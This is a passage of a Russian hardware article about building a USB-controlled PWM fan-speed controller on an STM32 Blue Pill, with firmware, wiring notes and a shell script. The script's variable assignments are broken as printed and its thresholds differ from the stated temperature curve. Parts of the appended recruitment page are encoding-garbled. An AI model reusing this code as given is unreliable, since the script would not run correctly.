                PWM +12 В, кулер сгорит, я проверил!


Собственно, если перед тобой не стоит задача именно управлять оборотами,
а хочется их просто снизить, чтобы система охлаждения работала потише,
можно использовать обычный мультивибратор на логике или «рассыпухе».
Коэффициент заполнения будет 50%, соответственно, и обороты 50%, а вот
шум упадет очень существенно. Впрочем, даже к мультивибратору можно
прикрутить регулировку заполнения.


ОТ ТЕОРИИ К ПРАКТИКЕ

Что‑то подобное я поначалу и планировал собрать, однако, поразмыслив,
понял, что неудобно каждый раз крутить ручку, ведь компьютер может рас‐
полагаться далеко. Нужно реализовать программное управление, а ручка —
это дополнительная опция. Осталось решить, как общаться с компьютером.
Прямо  скажем, мне очень хотелось  использовать UART, тем паче что
на материнской плате, под которую это ваялось, есть COM-порт, но к UART
нужен преобразователь уровней, а значит, пришлось бы добавлять лишний
корпус. Поэтому такой вариант я отбросил сразу.
   Чуть дольше я размышлял над аппаратным USB-UART на FT232, но это
тоже лютая избыточность. Думал даже использовать FT232 непосредственно
для генерации ШИМ, но такой вариант потребовал бы постоянно работа‐
ющей программы на компьютере, а мне хотелось иметь достаточную степень
автономности. В итоге я остановился на STM32F103 и его аппаратном USB.
   Прямо скажу, еще когда я ковырял bad USB, работать с USB мне не пон‐
равилось, но, видимо, отвертеться тут не удастся. Итак, концепт такой:
устройство со стороны компьютера выглядит как эмулятор COM-порта и слу‐
шает команды в текстовом виде. Получив команду, устройство настраивает
скважность ШИМ‑сигнала, идущего на кулеры. Схемка вырисовывается сов‐
сем простой, поэтому я решил даже не разводить отдельную плату, а исполь‐
зовать Blue pill. При этом я решил использовать выходы в режиме «открытый
коллектор» и добавил транзисторную сборку, которая напаяна «летучкой»
на плате переходника SOIC16/DIP. На мой взгляд, так чуть ниже вероятность
что‑то сжечь. Вся остальная обвязка уже установлена на Blue pill. Ниже пред‐
ставлена редуцированная схема Blue pill и подключение к ней транзисторной
сборки и вентиляторов.





                            Схема устройства

А так это выглядит в сборе.





                               Устройство в сборе




                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
    ОХЛАДИ СЕБЕ ВСЁ
              СОБИРАЕМ КОНТРОЛЛЕР
       ОБОРОТОВ ДЛЯ КОМПЬЮТЕРНЫХ
                           КУЛЕРОВ





ПРОШИВКА

        WWW

                     Все исходники проекта можно отыскать на моем
                        GitHub.


В этот раз прошивка будет простенькой. В примерах к библиотеке libopencm3
есть реализация устройства cdcacm (Communication Device Class (CDC)
Abstract  Control  Model  (ACM) USB  Devices). Со  стороны  компьютера
это устройство видится как эмулятор COM-порта. Причем, так как порт вир‐
туальный и на самом деле общение идет пакетами через USB, необ‐
ходимость настраивать этот порт отпадает. Осталось только внести неболь‐
шие правки в код.
   Добавляем инициализацию таймера TIM1, создаем функцию для записи
символов в буфер команд, которая считывает из буфера команду, как только
получит RETURN '\r', и выставляет извлеченные из команды значения ШИМ.
Еще, разумеется, немного подредактируем функцию cdcacm_data_rx_cb(),
чтобы все это заработало. Поскольку функций у устройства немного и про‐
шивка простая, можно использовать для парсинга команды функцию sscanf(
) из стандартной библиотеки.


...
#include <libopencm3/stm32/timer.h>
#include <stdio.h>
#include <string.h>
...
char bufer[128];
unsigned int fana=50;
unsigned int fanb=50;
unsigned int fanc=50;
...
void bufer_write(char *str, unsigned int strlen){
    static unsigned int pos=0;
    unsigned int i=0;
    unsigned int write_done=0;
    if(!write_done && strlen<=(127-pos)){
        for(unsigned int i=0; i<strlen; i++) bufer[pos++]=str[i];
        write_done=1;
        }
    if(!write_done && strlen>=(127-pos)){
        while(pos<128) bufer[pos++]=str[i++];
        pos=0;
        while(i<strlen) bufer[pos++]=str[i++];
        write_done=1;
        }
    if(bufer[pos-1]=='\r'){
        pos=0;
        run_cmd();/* gpio_toggle(GPIOB, GPIO12);*/
        }
    if(pos==128)pos=0;
    bufer[pos]=0;
    }
void run_cmd(){
    if(!strncmp(bufer,"set",3)){
        //printf("Найдена команда\n");
        sscanf(bufer, "set %d %d %d\r", &fana,&fanb,&fanc);
        gpio_toggle(GPIOB, GPIO12);
        for(uint8_t i=0; i<64;i++) bufer[i]=0;
        pwmset();
        //RUNCMD=0;
        //printf("%d %d %d \n",fana,fanb,fanc);
        }
    }
static void cdcacm_data_rx_cb(usbd_device *usbd_dev, uint8_t ep)
{
    (void)ep;
    (void)usbd_dev;


    char buf[64];
    int len = usbd_ep_read_packet(usbd_dev, 0x01, buf, 64);


    if (len) {
        //usbd_ep_write_packet(usbd_dev, 0x82, "test", 4);
        usbd_ep_write_packet(usbd_dev, 0x82, buf, len);
        //buf[len] = 0;
        bufer_write(buf,len);
    }
}
...
void pwm_init(){
    rcc_periph_clock_enable(RCC_TIM1);
    rcc_periph_clock_enable(RCC_GPIOA);


    // for F1....
    rcc_periph_clock_enable(RCC_AFIO);
    gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ,
GPIO_CNF_OUTPUT_ALTFN_PUSHPULL, GPIO8);
    gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ,
GPIO_CNF_OUTPUT_ALTFN_PUSHPULL, GPIO9);
    gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ,
GPIO_CNF_OUTPUT_ALTFN_PUSHPULL, GPIO10);
    //gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_50_MHZ,
GPIO_CNF_OUTPUT_ALTFN_PUSHPULL, GPIO11);


    rcc_periph_clock_enable(RCC_TIM1);
    timer_set_mode(TIM1, TIM_CR1_CKD_CK_INT, TIM_CR1_CMS_EDGE,
                   TIM_CR1_DIR_UP);
    timer_set_prescaler(TIM1,28);
    timer_set_oc_mode(TIM1, TIM_OC1, TIM_OCM_PWM2);
    timer_set_oc_mode(TIM1, TIM_OC2, TIM_OCM_PWM2);
    timer_set_oc_mode(TIM1, TIM_OC3, TIM_OCM_PWM2);
    //timer_set_oc_mode(TIM1, TIM_OC4, TIM_OCM_PWM2);
    timer_enable_oc_output(TIM1, TIM_OC1);
    timer_enable_oc_output(TIM1, TIM_OC2);
    timer_enable_oc_output(TIM1, TIM_OC3);
    //timer_enable_oc_output(TIM1, TIM_OC4);
    timer_enable_break_main_output(TIM1);
    timer_set_oc_value(TIM1, TIM_OC1, 50);
    timer_set_oc_value(TIM1, TIM_OC2, 50);
    timer_set_oc_value(TIM1, TIM_OC3, 50);
    //timer_set_oc_value(TIM1, TIM_OC4, 50);
    timer_set_period(TIM1, 100);
    timer_enable_counter(TIM1);
    }
void pwmset(){
    timer_set_oc_value(TIM1, TIM_OC1, fana);
    timer_set_oc_value(TIM1, TIM_OC2, fanb);
    timer_set_oc_value(TIM1, TIM_OC3, fanc);
    //timer_set_oc_value(TIM1, TIM_OC4, fand);
    }


int main(void)
{
    int i;


    usbd_device *usbd_dev;
    rcc_clock_setup_in_hse_8mhz_out_72mhz();
    rcc_periph_clock_enable(RCC_GPIOB);
    pwm_init();
    //rcc_periph_clock_enable(RCC_GPIOC);
    gpio_set(GPIOB, GPIO12);
    gpio_set_mode(GPIOB, GPIO_MODE_OUTPUT_2_MHZ,
              GPIO_CNF_OUTPUT_PUSHPULL, GPIO12);
    usbd_dev = usbd_init(&st_usbfs_v1_usb_driver, &dev, &config,
usb_strings, 3, usbd_control_buffer, sizeof(usbd_control_buffer));
    usbd_register_set_config_callback(usbd_dev, cdcacm_set_config);


    for (i = 0; i < 0x800000; i++)
        __asm__("nop");
    gpio_clear(GPIOB, GPIO12);


    while(1) usbd_poll(usbd_dev);


}

Принцип работы такой: устройство принимает пакеты символов по USB, пос‐
ле чего шлет их обратно (работает как ECHO) в качестве доказательства сво‐
ей корректной работы. А заодно отсылает их в буфер команд с помощью фун‐
кции bufer_write(), в которой реализован неполный кольцевой буфер. Он
хранит последние N полученных символов, а данная реализация просто
сбрасывается каждые 128 символов, так проще и быстрее. Для наших целей
и этого хватит. Как только функция натыкается на символ '\r', происходит
вызов функции run().
   Содержимое буфера парсится функцией sscanf(bufer,  "set  %d  %d
%d\r", &fana,&fanb,&fanc);, затем вызывается функция pwmset(), выс‐
тавляющая значения ШИМ, буфер заполняется нулями, и изменяется сос‐
тояние светодиода. Глядя на светодиод, легко оценить корректность работы
устройства. Из написанного выше нетрудно понять, что команда управления
выглядит как 'set X Y Z\r', где X, Y, Z — десятичные числа в интервале 20–
100, представляющие собой степень заполнения ШИМ‑сигнала на выходах
O1, O2, O3 микросхемы U2. Команда должна заканчиваться значением \r.


             INFO

                         Обрати внимание, что UNL2003 инвертирует сиг‐
                          нал, поэтому получает на вход инверсный ШИМ
                      (режим работы таймера TIM_OCM_PWM2). Если
                    UNL2003 не ставить, а брать сигнал прямо с кон‐
                           троллера,  что  возможно,  то  для  корректной
                      работы  устройства   стоит  выставить  режим
                    TIM_OCM_PWM1.


Вообще говоря, у TIM1 есть четыре выхода ШИМ, однако в данном случае
нам  будут  доступны  только  три,  так  как  PA11 —  это USB  D-  и  в
STM32F103C6T6 нет возможности переназначить эти выходы. Впрочем, если
очень хочется, можно задействовать остальные таймеры, но, на мой вкус, три
канала хватит с запасом.


ПОДКЛЮЧЕНИЕ

Для подключения устройства к кулерам были спаяны переходники, соеди‐
няющие три пина вентилятора с материнской платой (GND, VDD, TACHO),
а четвертый (PWM) — с нашим устройством. Причем для подключения девай‐
са в данном случае нужен лишь один провод, поскольку к земле устройство
подключено через USB. Такая конструкция позволяет управлять кулерами
с минимальным вмешательством в материнскую плату, кроме того, сохраня‐
ется штатный мониторинг оборотов вентиляторов.





                                Переходники

Легко видеть, что переходники состоят из двух спаянных четырехпиновых
разъемов, причем крайнее гнездо я удалил. Таким образом, контакт PWM
не соединяется с материнской платой. Переходник одной стороной подклю‐
чается к материнской плате, а второй к вентилятору. Очень важно соблюдать
полярность, чтобы не натворить бед. Осталось соединить всё вместе...





                        Подключение переходников

...и подключить к материнской плате, на моей RD450X как раз есть внут‐
ренний разъем USB.





                     Подключение к материнской плате


ИНТЕРФЕЙС

Пришло время проверить, как работает управление. Как я и говорил, настра‐
ивать порт не нужно, поскольку он виртуальный. Даже терминальную прог‐
рамму запускать не надо, можно просто воспользоваться командой echo
и перенаправлением вывода. Добавление себя в  группу uucp  избавит
от необходимости повышения привилегий.


sudo usermod -aG uucp candidum
$echo -n "set 95 95 95\r" >> /dev/ttyACM0

Ты услышишь, что вентиляторы разогнались, на экране осциллографа тоже
станут видны ожидаемые изменения.





                           Было 50%, стало 95%


СОФТ

Устройство есть, интерфейс есть, осталось автоматизировать контроль обо‐
ротов. Писать будем на Shell. Итак, с интервалом в 30 секунд мы будем узна‐
вать температуру и по ней выставлять обороты вентилятора. Чтобы получить
температуру процессора, воспользуемся утилитой sensors. В моей машине
два процессора и из‑за ориентации воздушных потоков CPU2 всегда горячее
CPU1. На его температуру мы и будем ориентироваться, соответственно,
в выводе sensors мы ищем следующее:


...
Package id 1:  +34.0°C  (high = +93.0°C, crit = +103.0°C)
...

А дальше с помощью нехитрой консольной магии достаем из этой строки
значение 34. Теперь зададим температурную кривую:


<45C  30%
 45C  50%
 50C  70%
 55C  85%
>60C  100%

И напоследок, чтобы минимизировать число записей в порт, будем в него
писать, только когда меняется значение PWM, а запоминать текущее зна‐
чение будем в файле /tmp/old_pwm. У меня получился такой скрипт:


#!/bin/zsh


OLDPWM= 30
PWM= 30


while [ true ]
do
#get temp
temp=$(sensors|grep "Package id 1:" |awk '{print $4}' |tr -d '+°C')
temp=${temp%.*}
#get old pwm
if [ -e /tmp/old_pwm ]; then OLDPWM=$(head -1 /tmp/old_pwm); fi
#set new pwm
PWM= 30
if [ $temp -ge 45 ]; then PWM= 50;fi
if [ $temp -ge 50 ]; then PWM= 70;fi
if [ $temp -ge 55 ]; then PWM= 80;fi
if [ $temp -ge 60 ]; then PWM= 90;fi
if [ $temp -ge 65 ]; then PWM= 100;fi
#save new pwm as old
echo $PWM > /tmp/old_pwm
#if $PWM != $OLDPWM send command to device
if [ $PWM -ne $OLDPWM ]; then echo -n  "set $PWM $PWM $PWM\r" >> /
dev/ttyACM0 ;fi
sleep 30
done

Осталось запустить скрипт в фоне.


nohup temp_control.sh &

Готово, теперь обороты вентилятора меняются динамически в зависимости
от температуры процессора. Дешево и сердито!
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №5 (302)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024